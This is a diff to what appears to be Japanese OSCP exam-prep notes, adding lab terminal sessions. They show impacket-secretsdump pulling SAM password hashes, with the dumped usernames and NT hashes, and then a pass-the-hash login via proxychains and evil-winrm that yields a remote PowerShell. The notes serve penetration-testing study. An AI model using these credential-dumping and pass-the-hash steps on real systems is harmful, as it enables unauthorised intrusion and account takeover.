@@ -309,7 +309,41 @@ https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md
 ┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A]
 └─$ samdump2 SYSTEM SAM > SAM.hash
 ```
+```
+┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A]
+└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
+[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
+tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
+Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
+David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
+Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
+[-] NTDSHashes.__init__() got an unexpected keyword argument 'ldapFilter'
+[*] Cleaning up... 
+```
+```
+┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A]
+└─$ proxychains evil-winrm -i 10.10.174.142 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
+*Evil-WinRM* PS C:\Users\tom_admin\Documents>
+```
 ## Tips
 
 ### URL エンコーディング
